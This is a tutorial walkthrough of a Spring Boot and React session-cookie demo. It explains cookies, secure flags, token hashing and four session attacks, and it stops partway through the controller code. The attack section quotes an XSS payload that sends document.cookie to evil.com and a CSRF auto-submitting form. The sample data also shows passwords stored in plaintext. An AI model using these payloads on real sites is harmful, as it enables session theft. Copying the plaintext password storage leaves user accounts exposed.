# CookieShookie — Full Walkthrough

Everything in this project, explained from zero. Read top to bottom once and
you will be able to answer anything reasonable about it.

> **Companion documents:** [README.md](README.md) is the short version and the
> run instructions. [TESTING.md](TESTING.md) is how to prove every security claim
> below — in the test suite, on the command line, in DevTools, and in the database.

**How to read this.** Part 1 is the concepts, with no code in it. Everything
after it is the code, and it will make far more sense if you have read Part 1
first — most of the project is a direct consequence of four or five ideas.

| | |
|---|---|
| **Part 0** | The 30-second version — what to say first |
| **Part 1** | **The ideas you need first** — statelessness, cookies, sessions, randomness, hashing, TLS, and the four attacks |
| **Part 2** | The big picture — two programs, three storage places |
| **Part 3** | The file structure |
| **Part 4** | The backend, file by file |
| **Part 5** | The frontend, file by file |
| **Part 6** | Where the cookie physically lives |
| **Part 7** | The full request lifecycle |
| **Part 8** | Your demo script |
| **Part 9** | Questions you might get |
| **Part 10** | Vocabulary cheat sheet |
| **Part 11** | If something breaks live |

---

# Part 0 — The 30-second version

Say this first in the meeting, then go into detail only if asked:

> "It's a sign-in page. Accounts are stored permanently in a database on the
> server. When you sign in, the server starts a **session** — a row in the
> database — and sends the browser a **cookie** containing nothing but that
> session's random id. Every time the page loads, the browser automatically
> sends the id back, the server looks the row up, and you're still signed in.
> That's what makes a refresh, a new tab, or reopening the browser tomorrow
> keep you logged in for up to 30 days.
>
> The cookie is `HttpOnly` so JavaScript can't read it, `Secure` so it only
> travels over HTTPS, and `SameSite` so other websites can't make your browser
> send it. Nothing personal is stored on the user's machine at all.
>
> Signing out deletes the row on the server, which kills that cookie
> everywhere at once — including any copy somebody else may have taken."

Everything below is just the detail behind those sentences.

## What this used to be, and why it changed

The first version of this project put the data straight into the cookie:

```
Cookie: userInfo=tejas%7CTejas+Jaiswal%7Ctejas%40example.com%7C3
```

That is one line of text sitting on the user's own disk. It could be read by any
script on the page, edited with a text editor, and watched by anyone on the same
wifi. The user could rename themselves or set their sign-in count to 9999.

The fix is the standard one, and it is worth being able to state in a sentence:
**stop putting data in the cookie; put a random id in the cookie and keep the
data on the server.** Everything else in this document follows from that.

---

# Part 1 — The ideas you need first

No code in this part. Nine short sections, and the rest of the document becomes
detail.

## 1.1 HTTP has no memory

Start here, because everything else is a consequence of it.

Every request that arrives at a web server arrives as a stranger. There is no
phone line held open between your browser and the server. Each request is a
separate sealed envelope:

```http
GET /api/me HTTP/1.1
Host: localhost:3000
```

The server reads it, answers it, and forgets you completely. If the same browser
sends another request one millisecond later, the server has no idea it is the
same person. This property has a name: HTTP is **stateless**.

That sounds like a flaw. It is actually the design, and it is why the web scales
— any server can answer any request, because no server is holding anything in
its head.

But every site that greets you by name has clearly solved it somehow. There are
only two mechanisms available: put something in the URL (ugly, and it leaks into
browser history, server logs and anything you paste), or **ask the browser to
hold a small piece of text and hand it back on every request.**

That second one is a cookie. Everything in this project is a consequence of one
decision: *what should that piece of text be?*

## 1.2 A cookie is two HTTP headers, and nothing else

This is worth demystifying early, because "cookie" sounds like a technology and
it is not. There is no file you write, no API, no library. There are two headers.

**Server to browser**, once:

```http
Set-Cookie: sid=ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos; Path=/; Max-Age=2592000; Secure; HttpOnly; SameSite=Lax
```

Meaning: *"please keep this string, and send it back with future requests to me."*

**Browser to server**, on every subsequent request, automatically:

```http
Cookie: sid=ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos
```

That is the entire mechanism. In Java, `response.addHeader(HttpHeaders.SET_COOKIE, …)`
produces the first line and `request.getCookies()` reads the second. Everything
else — `HttpOnly`, `Secure`, `SameSite`, `Max-Age` — are instructions bolted onto
the first line telling the browser *how carefully* to look after the string.

Two consequences are worth sitting with, because the rest of the project follows
from them:

1. **The browser does the remembering, not us.** We can only ask. A browser is
   free to ignore us, and a *hostile* client certainly will.
2. **The string sits on the user's computer.** They own that disk. Whatever we
   put in there, we have handed to them.

## 1.3 The two ways to remember someone

Here is the actual fork in the road, and the one thing to understand if you
understand nothing else.

Think of a coat check at a restaurant.

**Option A — hand them the coat.** The cookie carries the data itself:

```
Cookie: userInfo=tejas%7CTejas+Jaiswal%7Ctejas%40example.com%7C3
```

The server needs no memory at all; everything it needs to know arrives with the
request. **This is what this project used to do.**

**Option B — hand them a numbered ticket.** The cookie carries a meaningless id,
and the server keeps the coat:

```
Cookie: sid=ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos
```

The server looks the number up in a table. **This is what it does now**, and what
essentially every website you have ever signed into does.

| | **A: data in the cookie** | **B: id in the cookie** |
|---|---|---|
| Server storage needed | none | one row per signed-in browser |
| Work per request | none | one primary-key lookup |
| User can read their own data | yes | no |
| User can **edit** their own data | **yes** | no |
| A stolen copy can be cancelled | **no** | yes |
| Size limit | ~4KB, a real constraint | irrelevant |

The row that decides it is the fourth one. Under Option A, the data and the party
who must not be trusted with it are in the same place.

The price of Option B is one database lookup per request. It is a primary-key
lookup — about as fast as a database does anything — and large sites do it
billions of times a day. It is not a real cost.

> **"So what's a JWT then?"**
> A JWT is Option A done properly: the data is still in the cookie, but it is
> cryptographically **signed**, so editing it makes it invalid. That fixes
> tampering — but not revocation. A signed token stays valid until it expires,
> because there is nothing on the server to delete. For a 30-day "remember me"
> cookie, being able to kill it instantly is worth more than saving a lookup.
> Both designs are legitimate; what matters is knowing which trade you made.

## 1.4 Everything from a browser is input, and input is never trusted

This is the principle underneath the whole change, and it is more useful than any
individual flag.

Try it right now: `F12` → **Application** → **Cookies** → double-click the value
→ type anything you like → refresh. That is not a hack. It is a text field in a
tool that ships with every browser on earth.

So under Option A, "the sign-in count is 3" was never a fact the server knew. It
was a **claim** made by the least trustworthy party in the system.

The old code half-understood this:

```java
if (parts.length != 4 || !parts[3].matches("\\d+")) {
    return null;                       // damaged/edited → ignore it
}
```

That check rejects a *malformed* cookie. It cannot reject a *well-formed lie*.
`tejas|Someone Else|evil@example.com|999` satisfies every condition there and
always would have. **You cannot validate your way out of trusting the wrong
source.**

That is the real lesson, and it is bigger than this project: the fix was not to
add more checks. It was to stop keeping anything worth lying about in a place the
liar controls.

## 1.5 Randomness — why the ticket number must be unguessable

Once the cookie holds a ticket number, the security of the entire system reduces
to one question: **can somebody guess a valid ticket number?**

Two things have to be true. The numbers must be unpredictable, and there must be
far too many of them to search.

### Why not `java.util.Random`

`Random` is a formula — a linear congruential generator. It holds a number,
and each call transforms it deterministically. Observe two or three outputs and
you can recover its internal state, which gives you every output it will ever
produce, and every one it already did.

That is completely fine for shuffling a deck in a game. It is catastrophic for
anything that functions as a password.

`SecureRandom` draws from the operating system's entropy pool — timing jitter,
hardware noise, interrupt patterns — and is designed so that knowing every
previous output tells you nothing about the next one.

```java
private static final SecureRandom RANDOM = new SecureRandom();
```

One word of difference in the source. All of the difference in the property.

### Why 32 bytes

```java
byte[] bytes = new byte[32];   // 256 bits
```

2²⁵⁶ is roughly 10⁷⁷ — about the number of atoms in the observable universe. An
attacker guessing a billion ids per second since the Big Bang would not have made
a measurable dent.

The point of that number is not to be impressive. It is that **guessing is off
the table**, so an attacker has to *steal* a real one instead — which is why
everything after this section is about theft rather than guessing.

### Why it comes out as 43 characters

Raw bytes cannot go into an HTTP header; many byte values are illegal there or
have their own meaning. Base64 re-encodes binary using only safe characters, at
6 bits per character: 32 × 8 ÷ 6 = 42.67, rounded up to **43**. We use the
URL-safe variant (`-` and `_` instead of `+` and `/`) and drop the `=` padding,
so the value needs no escaping anywhere:

```
ULaB692K73XLZK_HUbqwX3PDfrFO8PnjlbMCQrwDVos
```

## 1.6 Hashing — and why the database doesn't store the id either

### What a hash is

A one-way function. Any input, of any length, produces a fixed-size output. The
same input always gives the same output. A slightly different input gives a
completely different output. And there is no way back.

Real numbers, taken from an actual run of this project:

```
dAgS4kVhnTMq2nLNb2DXiyJP-eqMo2EYKlYIE78ydfY
                    ↓  SHA-256
3bb5a229766c16c4662014fedcc78f4a2bbaf54cc03b3186052b948871ca53fa
```

Run it a million times, you get the same answer every time. Change one character
of the input and the output is unrecognisable. Given only the bottom line, there
is no procedure that recovers the top one — you can only guess inputs and check.

### Hashing is not encryption

Encryption is reversible **by design** — the entire point is to decrypt it later.
Hashing has no reverse at all. That is exactly what makes it right for storing
things you only ever need to **check**, never **read back**.

You never need to read a password back. You only need to answer "does the one
just typed match?" — and comparing hashes answers that without the original ever
being stored.

### Why hash a session id

Because a session id is a **live credential**. Whoever holds it *is* the user; no
password required. If the table stored it raw, then a leaked backup, a stray
debug log, a screenshot of the H2 console, or a curious person with read access
would all be handing out working sessions.

Storing the hash means the table can **recognise** a session id but never
**produce** one. Same reasoning as hashing passwords, applied one layer up.

Mechanically: the cookie carries the raw token, and every request hashes what
arrived and looks up the hash.

```
browser holds:   dAgS4kVh…ydfY          ← the credential
database holds:  3bb5a229…53fa          ← a fingerprint of it
```

### Why SHA-256 here, but BCrypt for passwords

This distinction gets asked about, and getting it right is a good signal.

BCrypt is **deliberately slow** — thousands of internal rounds — because human
passwords are weak. `hunter2` has maybe 20 bits of entropy, and against a stolen
table a fast hash lets an attacker try billions of candidates per second.
Slowness is the whole defence.

Our token has 256 bits of *true* randomness. There is no dictionary to try and no
pattern to exploit, so there is nothing for slowness to defend against — we would
just be burning CPU on every single request for zero benefit.

> **Rule of thumb: BCrypt for secrets a human chose. SHA-256 for secrets a
> cryptographic random number generator chose.**

## 1.7 HTTPS — what it actually does

TLS (the S in HTTPS) gives you three distinct things, and it is worth naming them
separately because people conflate them:

1. **Encryption** — anybody between the browser and the server sees noise.
2. **Integrity** — they cannot quietly alter the traffic in flight.
3. **Identity** — the certificate proves the server is who it claims to be.

Without it, every request is a postcard. On café wifi, the
`Cookie: sid=…` header is sitting there in plain text. Copy it, paste it into
your own browser, and you are signed in as that person — no password needed,
because as established, **the id is the credential**.

That is why `Secure` and HTTPS are one feature rather than two. `Secure` says
"only send this cookie over an encrypted connection". With no HTTPS available, it
does not protect the cookie; it simply stops it being sent at all.

### Certificates, and why your browser warns you

A certificate is a statement — "this public key belongs to `localhost`" — signed
by somebody. In production the signer is a Certificate Authority the browser
already trusts, like Let's Encrypt. Our `keytool` command produced a certificate
signed **by itself**, which proves nothing about identity whatsoever.

So on this laptop you get encryption and integrity, but not identity — hence the
warning. **The warning is the check working.** Being able to say that is worth
more than making it go away.

### What HTTPS does not do

It protects the cookie **in transit**. It does nothing about:

- a script running on the page reading the cookie → that is `HttpOnly`
- another website causing your browser to send it → that is `SameSite`
- somebody who already has a copy → that is revocation

Which is exactly why the next section exists.

## 1.8 The four ways a session gets stolen

Every defence in this project maps to exactly one of these. Learn them as pairs —
attack and answer — and the code stops looking like a pile of settings.

### Attack 1 — Sniffing (session hijacking)

Somebody on the same network reads `Cookie: sid=…` off the wire and replays it
from their own machine. They are now you.

**Answer: HTTPS + `Secure`.** There is nothing readable on the wire, and the
browser will not send the cookie over an unencrypted connection even if asked.

### Attack 2 — XSS (cross-site scripting)

The attacker gets their JavaScript to run **on your page** — through a comment
field that renders raw HTML, a compromised npm dependency, an unescaped username
displayed somewhere. Their payload is one line:

```js
fetch('https://evil.com/steal?c=' + document.cookie)
```

and they have the session of every user who loads that page.

**Answer: `HttpOnly`.** The browser refuses to include the cookie in
`document.cookie`. Note carefully what this does *not* do: the cookie is still
sent on every request — the *browser* attaches it — JavaScript simply cannot see
it. That one-liner now exfiltrates an empty string.

This is also why the account screen no longer displays the raw cookie the way it
used to. The same setting that let *our* code read it would let *their* code read
it. There is no way to have one without the other.

### Attack 3 — CSRF (cross-site request forgery)

You are signed in to our app. In another tab you open `evil.com`, which contains:

```html
<form action="https://ourapp/api/logout" method="POST" id="f"></form>
<script>document.getElementById('f').submit()</script>
```

Your browser fires that request and, being helpful, **attaches your cookie**. The
server sees a perfectly authenticated request and does what it says.

The thing to notice is that the attacker never *reads* anything. They do not need
to see your cookie — they just need your browser to send it. That is why
`HttpOnly` alone does not help here.

**Answer: `SameSite=Lax`.** The browser will not attach the cookie to a request
that another site initiated. `Lax` still attaches it when you *navigate* to us by
clicking a link, which is why following a link from an email still finds you
signed in. `Strict` blocks even that, at the cost of surprising people.

### Attack 4 — Session fixation

The subtle one, and the reason for a line of code that otherwise looks pointless.

The attacker gets a session id **of their choosing** into **your** browser
*before* you log in — via a compromised subdomain, a stray `Set-Cookie`, or an
old-style `?sessionid=…` link. Then you log in normally, and the server upgrades
that very session to "signed in as you". The attacker has known the id all along.

Again, notice: nothing was stolen. It was planted, and then waited for.

**Answer: mint a brand-new id at the moment privilege changes.**

```java
sessions.revoke(oldToken);                        // whatever was planted is now dead
SessionService.IssuedSession issued = sessions.mint(user, visits);
```

### And the one you cannot fully stop

If somebody obtains a valid cookie anyway — malware on the machine, an unlocked
laptop, a browser extension — they have that session. You cannot make theft
impossible.

What you *can* do is shrink the window: an expiry the server enforces itself, and
a sign-out button that genuinely works. That is why `expires_at` is a column and
why "Sign out" deletes a row.

## 1.9 Defence in depth

None of the above is sufficient on its own. That is not a weakness in the design
— it *is* the design.

| Layer | What it stops | What it does **not** stop |
|---|---|---|
| Opaque random id | reading or editing the data | theft of the id |
| HTTPS + `Secure` | reading it off the network | scripts running on the page |
| `HttpOnly` | scripts reading it | other sites causing it to be sent |
| `SameSite=Lax` | other sites using it | somebody who has a copy |
| Hash stored in the DB | a database leak yielding credentials | a live cookie |
| New id on every login | ids planted before login | theft after login |
| Server-side revoke | a copy somebody already took | — |
| Server-side expiry | old copies replayed forever | — |

Read the right-hand column top to bottom: **every gap is closed by the line
below it.** That is what "defence in depth" means, and being able to say it in
one sentence — *"no single control is sufficient, so each one covers the
previous one's blind spot"* — is worth more in a review than reciting any
individual flag.

---

# Part 2 — The big picture

## Two programs, not one

```
   ┌────────────────────────┐         ┌──────────────────────────┐
   │  React (the frontend)  │  https  │ Spring Boot (the backend)│
   │  localhost:3000        │ ──────▶ │ localhost:8443           │
   │  what you SEE          │ ◀────── │ the LOGIC + the DATABASE │
   │  runs in the browser   │         │ runs in Java             │
   └────────────────────────┘         └──────────────────────────┘
```

They are two separate servers you start in two terminals. React draws the
screen; it holds no data of its own. Java owns all the data.

Both now speak **HTTPS**, not HTTP. That is not decoration: a cookie marked
`Secure` is only sent over an encrypted connection, so without TLS the whole
protection is inert.

## Three storage places — the single most important idea

| | **`APP_USER`** | **`USER_SESSION`** | **Cookie** |
|---|---|---|---|
| Physically lives | server, `backend/data/cookiedemo.mv.db` | same database file | the **user's browser** |
| Stores | username, password, name, email, **visit count** | hashed session id, name, email, expiry | one random id |
| Who can see it | everyone shares one table | one row per signed-in browser | only that browser |
| Survives | forever | 30 days, or until you sign out | same |
| Written by | **Register**, and every visit | **Sign in** | **Sign in** |

**Register** puts a row in `APP_USER`. **Sign in** puts a row in `USER_SESSION`
and sends its id to the browser. **Every page load** turns that id back into a
row — and that is what keeps you signed in.

The middle column is the one that is new, and it is the whole change. The data
that used to sit on the user's disk now sits in a table we control.

## The visit counter, and where it ended up

The counter has moved twice, and the journey is worth following because each move
was forced by something.

| Version | Where the count lived | Why it moved |
|---|---|---|
| Original | in the **cookie** | the user could edit it to anything |
| Then | on the **session row** | signing out revokes the session, so it restarted at 1 every time |
| Now | on the **account** (`APP_USER.VISITS`) | survives sign-out, survives session rotation |

It goes up on a fresh sign-in **and on every returning page load** — refresh,
new tab, reopen the browser tomorrow. All of those hit `/api/me`, which resolves
a live session without anybody typing a password, and that is exactly what a
"visit" is.

**It is deliberately not shown anywhere.** Not on screen, not in the JSON. To
watch it climb you open the H2 console and look at `APP_USER.VISITS`. That is the
demo now: *"there is a number about you that the browser is never told, cannot
read, and cannot influence."*

Which is the real point. Under the old design you could open DevTools and make
the cookie say `…|900`. Try editing the cookie now and the app just says "not
signed in", because the string you typed matches no row.

---

# Part 3 — The file structure

```
cookie/
│
├─ backend/                                 ← the Java side
│  ├─ mvnw / mvnw.cmd                       run Maven without installing it
│  ├─ make-keystore.cmd / .sh             ★ creates the HTTPS certificate (run once)
│  ├─ pom.xml                               list of libraries to download
│  ├─ data/cookiedemo.mv.db                 the actual database file (auto-created)
│  └─ src/
│     ├─ main/
│     │  ├─ java/com/example/cookiedemo/
│     │  │  ├─ CookieDemoApplication.java   starts everything
│     │  │  ├─ AppUser.java                 one row in APP_USER
│     │  │  ├─ UserRepository.java          account queries
│     │  │  ├─ UserSession.java           ★ one row in USER_SESSION
│     │  │  ├─ SessionRepository.java     ★ session queries
│     │  │  ├─ SessionService.java        ★ mint / look up / revoke / purge
│     │  │  └─ AuthController.java        ★ the 4 endpoints + the cookie flags
│     │  └─ resources/
│     │     ├─ application.properties        HTTPS, cookie and database settings
│     │     └─ keystore.p12                  the TLS certificate (gitignored)
│     └─ test/
│        ├─ java/.../SessionSecurityTest.java  ★ 17 tests that prove the claims
│        └─ resources/application.properties   in-memory database for tests
│
└─ frontend/                                ← the React side
   ├─ .env                                ★ HTTPS=true for the dev server
   ├─ package.json                          libraries
   ├─ public/index.html                     the empty page React fills in
   └─ src/
      ├─ setupProxy.js                    ★ forwards /api to https://localhost:8443
      ├─ index.js                           startup + theme
      ├─ App.js                             which screen to show?
      ├─ AuthPanel.js                       sign-in / register form
      ├─ Account.js                         the screen after signing in
      ├─ api.js                             the 4 calls to Java
      └─ glass.css                          all the styling
```

★ = new or substantially changed.

**If your manager only opens one file, it will be `AuthController.java`.**
That is where the cookie is built and read, and its comment block is the
before/after summary in condensed form. `SessionService.java` is the second one
to know: it is where the random id is generated, hashed and revoked.

---

# Part 4 — The backend, file by file

## 4.1 `pom.xml` — the shopping list

Maven is Java's package manager. `pom.xml` says which libraries to download.
Ours asks for four:

```xml
<dependency>  spring-boot-starter-web       </dependency>  <!-- web server + URLs -->
<dependency>  spring-boot-starter-data-jpa  </dependency>  <!-- talk to a database -->
<dependency>  h2                            </dependency>  <!-- the database itself -->
<dependency>  spring-boot-starter-test      </dependency>  <!-- JUnit + MockMvc, test scope -->
```

The `<parent>` block at the top pins Spring Boot to **3.5.16**, which decides
the version of every other library so they can't conflict.

Note the last one has `<scope>test</scope>`: it is available to `src/test/java`
only and is never shipped inside the jar.

> **If asked "why 3.5.16?"** — "Anything 3.5 or newer works on modern JDKs.
> The older 3.3 line ships a library that refuses to start on Java 26."
>
> **If asked "did you need a library for the security?"** — no. `SecureRandom`,
> `MessageDigest` and Spring's own `ResponseCookie` are all standard. Nothing was
> added to make the cookie secure; the only new dependency is for the tests.

## 4.2 `application.properties` — the settings

Not code, just `key=value` settings Spring reads at startup. This file changed
more than any other.

```properties
# ---- HTTPS ----
server.port=8443                                   # the conventional dev https port
server.ssl.enabled=true                            # turn TLS on
server.ssl.key-store=classpath:keystore.p12        # where the certificate is
server.ssl.key-store-type=PKCS12
server.ssl.key-alias=cookiedemo
server.ssl.key-store-password=${KEYSTORE_PASSWORD:changeit}
server.ssl.enabled-protocols=TLSv1.3,TLSv1.2       # refuse the old broken versions

# ---- the session cookie ----
app.session.cookie-name=sid
app.session.cookie-secure=true                     # the Secure attribute
app.session.cookie-same-site=Lax
app.session.ttl-minutes=43200

# ---- database (unchanged) ----
spring.datasource.url=jdbc:h2:file:./data/cookiedemo
spring.datasource.username=sa
spring.datasource.password=
spring.jpa.hibernate.ddl-auto=update
spring.jpa.open-in-view=false
spring.h2.console.enabled=true
```

The ones that matter:

- **`server.ssl.*`** — five lines is genuinely all it takes to turn a Spring Boot
  app from HTTP to HTTPS. The certificate lives in `keystore.p12`, which is
  **not** in git (a private key is a secret) and is created once by
  `backend/make-keystore.cmd`.
- **`${KEYSTORE_PASSWORD:changeit}`** — read the environment variable
  `KEYSTORE_PASSWORD`, and fall back to `changeit` if it is not set. That is how
  you keep a real password out of a file that goes into version control.
- **`jdbc:h2:file:./data/cookiedemo`** — `file:` means "save to disk", so accounts
  survive a restart. (`mem:` would mean RAM-only and vanish every restart.)
- **`ddl-auto=update`** — on startup, Hibernate compares your Java classes to the
  database and creates or alters tables to match. **This is why the project
  contains zero `CREATE TABLE` statements** — and why the new `USER_SESSION`
  table appeared by itself the first time the app started.

> **Likely question: "Why is the certificate self-signed?"**
> "Because it is a laptop. A self-signed certificate proves the traffic is
> encrypted but proves nothing about *who* is at the other end, which is why the
> browser warns. In production you use a certificate from a CA like Let's
> Encrypt, or more commonly you terminate TLS at a load balancer in front of the
> app and it never sees a certificate at all."

## 4.3 `CookieDemoApplication.java` — the ignition key

```java
@SpringBootApplication
@EnableScheduling
public class CookieDemoApplication {
    public static void main(String[] args) {
        SpringApplication.run(CookieDemoApplication.class, args);
    }
}
```

That one `run(...)` line starts a web server (Tomcat, now with TLS), starts H2,
scans the folder for your other classes, and wires them together.

`@SpringBootApplication` is the annotation that turns scanning on. An
**annotation** is the `@Something` syntax — a label you attach to a class or
method that tells a framework to do something with it. They are not commands
that run; they are instructions Spring reads.

`@EnableScheduling` is new. It switches on the `@Scheduled` method in
`SessionService` that sweeps expired session rows out of the table once an hour.
Without this annotation, that method would simply never be called.

## 4.4 `AppUser.java` — one row in the database

```java
@Entity
@Table(name = "app_user")
public class AppUser {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(unique = true, nullable = false)
    private String username;

    @Column(nullable = false) private String password;
    @Column(nullable = false) private String fullName;
    @Column(nullable = false) private String email;

    @Column(nullable = false, columnDefinition = "INT DEFAULT 0 NOT NULL")
    private int visits;                                    // ← the counter lives here

    public int recordVisit() { return ++visits; }

    // + an empty constructor, a full constructor, and getters/setters
}
```

Line by line:

| Code | Meaning |
|---|---|
| `@Entity` | "Turn this class into a database table." |
| `@Table(name="app_user")` | Name the table `APP_USER`. |
| `@Id` | This field is the primary key. |
| `@GeneratedValue(IDENTITY)` | The database assigns 1, 2, 3… automatically. |
| `@Column(unique=true)` | The database itself refuses a duplicate username. |
| `@Column(nullable=false)` | This column cannot be empty. |

The resulting table:

| ID | USERNAME | PASSWORD | FULL_NAME | EMAIL | VISITS |
|---|---|---|---|---|---|
| 1 | tejas | pass123 | Tejas Jaiswal | tejas@example.com | 7 |

### That `columnDefinition` is not decoration

```java
@Column(nullable = false, columnDefinition = "INT DEFAULT 0 NOT NULL")
```

`ddl-auto=update` has to **add** this column to a table that already contains
rows. A database cannot add a `NOT NULL` column to a populated table unless you
tell it what to put in the existing rows — so without the `DEFAULT 0`, the app
refuses to start against your existing database and you would have to delete
`backend/data/` and lose every account.

This is a small taste of a real schema migration. `ddl-auto=update` handles
additive changes like this one; it will **not** drop or rename columns, which is
why a serious project uses Flyway or Liquibase instead.

> **Why is the counter here and not on the session?** Because signing out now
> deletes the session row. A per-session counter would restart at 1 on every
> sign-out and measure nothing. See Part 2.

Note `fullName` (Java) becomes `FULL_NAME` (SQL) — Hibernate converts camelCase
to snake_case automatically.

> **Why the empty constructor?** Hibernate builds a blank object first, then
> fills the fields in. Without it, it can't create the object at all.

> **Why is the class called `AppUser` and not `User`?** `USER` is a reserved word
> in many SQL databases, so naming the table `app_user` avoids a clash.

## 4.5 `UserRepository.java` — the database queries

```java
public interface UserRepository extends JpaRepository<AppUser, Long> {
    Optional<AppUser> findByUsername(String username);
    boolean existsByUsername(String username);
}
```

This is an **interface** — method names with no bodies. You will never find the
code that implements them, and that is the point: at startup Spring **generates
the implementation for you** by reading the method names.

- `findByUsername` → `SELECT * FROM app_user WHERE username = ?`
- `existsByUsername` → `SELECT COUNT(*) > 0 FROM app_user WHERE username = ?`

Extending `JpaRepository<AppUser, Long>` (entity type, ID type) also gives you
`save()`, `findAll()`, `deleteAll()`, `count()` for free.

`Optional<AppUser>` is Java's "maybe there's a user, maybe there isn't" wrapper.
It forces you to handle the not-found case instead of crashing on a null.

> **This is the single most impressive-sounding thing in the project.**
> "I never wrote any SQL. Spring reads the method name and generates the query."

## 4.6 `UserSession.java` — ★ one row per signed-in browser

**This class is Option B from §1.3 made concrete** — it is the coat, sitting on
our side of the counter. Same idea as `AppUser`: an `@Entity` that Hibernate
turns into a table, `USER_SESSION`.

```java
@Entity
@Table(name = "user_session")
public class UserSession {

    @Id
    @Column(length = 64, nullable = false, updatable = false)
    private String id;            // SHA-256 of the cookie's value, hex — 64 chars

    @Column(nullable = false) private String username;
    @Column(nullable = false) private String fullName;   // what the cookie used to hold
    @Column(nullable = false) private String email;      // what the cookie used to hold
    @Column(nullable = false) private int visits;        // a snapshot — see below

    @Column(nullable = false) private Instant createdAt;
    @Column(nullable = false) private Instant lastSeenAt;
    @Column(nullable = false) private Instant expiresAt;
}
```

> **`visits` here is a snapshot, not the live number.** It records where the
> account's counter stood when this session began, and never changes afterwards.
> The counter that actually moves lives on `AppUser`. Reading this one expecting
> it to be current is the mistake to avoid.

Two things to notice.

**First, the primary key is a `String`, not a `Long`.** There is no row number.
The session's id *is* its identity, so looking one up is a primary-key lookup —
about as fast as a database does anything.

**Second, that id is a hash, not the cookie's value** — the full reasoning is
§1.6, and the one-paragraph version to have ready is:

> A session id is a live credential. Whoever holds it **is** the user — no
> password needed. If we stored it raw, then a leaked backup, a stray log line,
> or someone glancing at the H2 console would hand over working sessions. We
> store `SHA-256(token)` instead, so the table can *recognise* a session id but
> never *produce* one. It is the same reasoning as hashing passwords, applied one
> layer up.

And the follow-up, if they know their stuff — *"why plain SHA-256 and not
BCrypt?"* — is the rule from §1.6: **BCrypt for secrets a human chose, SHA-256
for secrets a random number generator chose.** There is no dictionary to try
against 256 bits of entropy, so slowness would buy nothing and cost us CPU on
every request.

The resulting table:

| ID | USERNAME | FULL_NAME | EMAIL | VISITS | EXPIRES_AT |
|---|---|---|---|---|---|
| `3bb5a229…53fa` | demo | Demo User | demo@example.com | 1 | 2026-09-04 … |

`expiresAt` deserves its own note. The cookie carries a `Max-Age` too, but that
is only a polite request to the browser — a saved copy can be replayed long
after it was supposed to be thrown away. **This column is the deadline that is
actually enforced**, because it is the one we own.

## 4.7 `SessionRepository.java` — ★ session queries

Exactly the same trick as `UserRepository`: declare the names, Spring writes
the SQL.

```java
public interface SessionRepository extends JpaRepository<UserSession, String> {
    long deleteByExpiresAtBefore(Instant cutoff);   // the hourly cleanup
    long deleteByUsername(String username);         // "sign out everywhere"
    List<UserSession> findByUsername(String username);
}
```

Note the second type parameter is `String` now, because the key is the hashed id.

## 4.8 `SessionService.java` — ★ where the id is born and dies

Four jobs: **mint**, **look up**, **revoke**, **purge**. Putting them here rather
than in the controller means the expiry check can never be forgotten.

### Minting the id

```java
private static final int TOKEN_BYTES = 32;                       // 256 bits
private static final SecureRandom RANDOM = new SecureRandom();
private static final Base64.Encoder ENCODER =
        Base64.getUrlEncoder().withoutPadding();

public IssuedSession mint(AppUser user, int visits) {
    byte[] bytes = new byte[TOKEN_BYTES];
    RANDOM.nextBytes(bytes);
    String token = ENCODER.encodeToString(bytes);      // → goes to the browser

    Instant now = Instant.now();
    UserSession row = new UserSession(hash(token), user, visits, now, now.plus(ttl));
    sessions.save(row);                                // → only the HASH is stored

    return new IssuedSession(token, row);
}
```

Three decisions in nine lines, and each one is a question you might get:

| Choice | Why |
|---|---|
| **32 bytes** | 256 bits. A short id could be brute-forced by a script trying a million cookies; at 256 bits guessing is not a thing that happens, so an attacker has to *steal* the cookie instead — which is what `HttpOnly`/`Secure`/`SameSite` are for. |
| **`SecureRandom`, not `Random`** | `java.util.Random` is a predictable formula seeded from the clock: see a few outputs and you can compute every future one. `SecureRandom` reads the operating system's entropy pool. For anything that acts as a password, this is the whole ballgame. |
| **Base64**`url`**, no padding** | Produces only `A–Z a–z 0–9 - _`, all legal in a cookie with no escaping. 32 bytes → exactly 43 characters. |

### Looking it up

```java
public Optional<UserSession> lookup(String token) {
    if (token == null || token.isBlank()) return Optional.empty();

    Optional<UserSession> found = sessions.findById(hash(token));
    if (found.isEmpty()) return Optional.empty();

    UserSession session = found.get();
    Instant now = Instant.now();

    if (session.isExpired(now)) {          // enforced HERE, on the server
        sessions.delete(session);
        return Optional.empty();
    }

    session.setLastSeenAt(now);
    return Optional.of(session);
}
```

An empty result means exactly one thing to the caller: *this browser is not
signed in.* Missing cookie, garbage cookie, invented cookie, expired cookie —
all four give the same answer, deliberately. Telling an attacker which of those
went wrong is free information they should not get.

### Revoking

```java
public void revoke(String token) {
    if (token != null && !token.isBlank()) sessions.deleteById(hash(token));
}
```

Two lines, and **this is the capability the old design simply did not have.**
When the data lived in the cookie, "logging out" meant asking the browser nicely
to delete it — and if a copy had already been taken, that copy kept working for
the full 30 days with nothing the server could do. Now the truth is a row.

### Purging

```java
@Scheduled(initialDelayString = "PT1M", fixedDelayString = "PT1H")
public void purgeExpired() {
    sessions.deleteByExpiresAtBefore(Instant.now());
}
```

Housekeeping, not security — expired rows are already rejected on read. This
just stops the table filling up with dead sessions. Runs an hour after startup
and hourly after that.

## 4.9 `AuthController.java` — ★ the endpoints and the cookie flags

A **controller** maps URLs to Java methods.

```java
@RestController              // this class answers web requests; return values become JSON
@RequestMapping("/api")      // every URL in here starts with /api
public class AuthController {

    private final UserRepository users;
    private final SessionService sessions;

    private final String cookieName;      // "sid"
    private final boolean cookieSecure;   // true
    private final String cookieSameSite;  // "Lax"
    private final Duration cookieMaxAge;  // 30 days

    public AuthController(UserRepository users,
                          SessionService sessions,
                          @Value("${app.session.cookie-name:sid}") String cookieName,
                          @Value("${app.session.cookie-secure:true}") boolean cookieSecure,
                          @Value("${app.session.cookie-same-site:Lax}") String cookieSameSite,
                          @Value("${app.session.ttl-minutes:43200}") long ttlMinutes) { … }
```

That constructor is **dependency injection**: you never write
`new UserRepository()`. Spring creates it once and hands it over.

`@Value("${key:default}")` pulls a value out of `application.properties`, using
the text after the colon if the key is missing. The security settings are
configuration rather than constants so they can be changed per environment —
and so the test suite can pin them.

### Endpoint 1 — Register (writes to the DATABASE)

```java
@PostMapping("/register")
